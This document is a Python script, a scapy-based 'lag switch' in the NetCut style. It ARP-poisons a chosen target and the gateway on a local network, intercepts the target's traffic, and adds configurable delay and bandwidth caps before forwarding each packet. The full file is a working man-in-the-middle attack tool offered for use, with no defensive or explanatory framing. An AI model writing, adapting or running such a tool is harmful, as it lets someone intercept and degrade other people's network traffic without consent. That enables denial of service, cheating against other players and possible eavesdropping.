#!/usr/bin/env python3
"""MITM lag switch — delay + optional kbps cap per direction (NetCut-style)."""

import json
import sys
import threading
import time

try:
    from scapy.all import ARP, Ether, IP, conf, get_if_hwaddr, getmacbyip, sendp, sniff
    from scapy.arch.windows import get_windows_if_list
except ImportError:
    print("Install scapy: pip install scapy", file=sys.stderr)
    sys.exit(1)


def normalize_mac(mac: str) -> str:
    return mac.replace("-", ":").lower()


def resolve_iface(name: str) -> str:
    if sys.platform != "win32":
        return name
    name_l = name.lower()
    for iface in get_windows_if_list():
        desc = (iface.get("description") or "").lower()
        ifname = (iface.get("name") or "").lower()
        if name_l in desc or name_l in ifname or desc in name_l:
            return iface.get("name") or name
    return name


class TokenBucket:
    def __init__(self, kbps: int):
        self.unlimited = kbps <= 0 or kbps >= 900_000
        self.rate = max(0, kbps) * 1024 / 8
        self.tokens = self.rate * 2 if self.rate else 0
        self.max_burst = self.rate * 2 if self.rate else 0
        self.last = time.time()

    def allow(self, nbytes: int) -> bool:
        if self.unlimited:
            return True
        now = time.time()
        elapsed = now - self.last
        self.last = now
        self.tokens = min(self.max_burst, self.tokens + elapsed * self.rate)
        if self.tokens >= nbytes:
            self.tokens -= nbytes
            return True
        return False


def main():
    if len(sys.argv) < 8:
        print("Usage: arp_lag.py <target_ip> <target_mac> <gateway_ip> <iface> "
              "<outgoing_ms> <incoming_ms> <mode> [upload_kbps] [download_kbps]", file=sys.stderr)
        sys.exit(1)

    target_ip = sys.argv[1]
    target_mac = normalize_mac(sys.argv[2])
    gateway_ip = sys.argv[3]
    iface = resolve_iface(sys.argv[4])
    outgoing_ms = max(0, int(sys.argv[5]))
    incoming_ms = max(0, int(sys.argv[6]))
    mode = sys.argv[7].lower()
    upload_kbps = int(sys.argv[8]) if len(sys.argv) > 8 else 0
    download_kbps = int(sys.argv[9]) if len(sys.argv) > 9 else 0

    conf.iface = iface
    conf.verb = 0
    our_mac = normalize_mac(get_if_hwaddr(iface))
    up_bucket = TokenBucket(upload_kbps)
    down_bucket = TokenBucket(download_kbps)
    traffic = {"tx": 0, "rx": 0}
    traffic_lock = threading.Lock()

    def resolve_gateway_mac():
        try:
            mac = getmacbyip(gateway_ip)
            if mac:
                return normalize_mac(mac)
        except Exception:
            pass
        return "ff:ff:ff:ff:ff:ff"

    def poison_loop():
        while True:
            gw_mac = resolve_gateway_mac()
            sendp(
                Ether(dst=target_mac)
                / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=our_mac),
                iface=iface,
                verbose=0,
            )
            sendp(
                Ether(dst=gw_mac)
                / ARP(op=2, pdst=gateway_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=our_mac),
                iface=iface,
                verbose=0,
            )
            time.sleep(2)

    def emit_traffic():
        last_tx, last_rx = 0, 0
        last_t = time.time()
        while True:
            time.sleep(2)
            now = time.time()
            dt = now - last_t
            with traffic_lock:
                dtx = traffic["tx"] - last_tx
                drx = traffic["rx"] - last_rx
                last_tx, last_rx = traffic["tx"], traffic["rx"]
            last_t = now
            if dt <= 0:
                continue
            print(
                json.dumps(
                    {
                        "type": "traffic",
                        "ip": target_ip,
                        "mac": target_mac,
                        "upload": round(max(0, (dtx * 8) / (dt * 1024 * 1024)), 3),
                        "download": round(max(0, (drx * 8) / (dt * 1024 * 1024)), 3),
                    }
                ),
                flush=True,
            )

    def forward(pkt):
        if IP not in pkt or Ether not in pkt:
            return
        ip = pkt[IP]
        nbytes = int(ip.len) if ip.len else len(ip)

        if ip.src == target_ip and mode in ("outgoing", "all"):
            if not up_bucket.allow(nbytes):
                return
            if outgoing_ms > 0:
                time.sleep(outgoing_ms / 1000.0)
            with traffic_lock:
                traffic["tx"] += nbytes
            sendp(Ether(src=our_mac, dst=resolve_gateway_mac()) / ip, iface=iface, verbose=0)
        elif ip.dst == target_ip and mode in ("incoming", "all"):
            if not down_bucket.allow(nbytes):
                return
            if incoming_ms > 0:
                time.sleep(incoming_ms / 1000.0)
            with traffic_lock:
                traffic["rx"] += nbytes
            sendp(Ether(src=our_mac, dst=target_mac) / ip, iface=iface, verbose=0)

    print(
        json.dumps(
            {
                "type": "started",
                "ip": target_ip,
                "out_ms": outgoing_ms,
                "in_ms": incoming_ms,
                "up_kbps": upload_kbps,
                "down_kbps": download_kbps,
            }
        ),
        flush=True,
    )
    threading.Thread(target=poison_loop, daemon=True).start()
    threading.Thread(target=emit_traffic, daemon=True).start()
    sniff(filter=f"ip host {target_ip}", prn=forward, store=0, promisc=True, iface=iface)


if __name__ == "__main__":
    main()
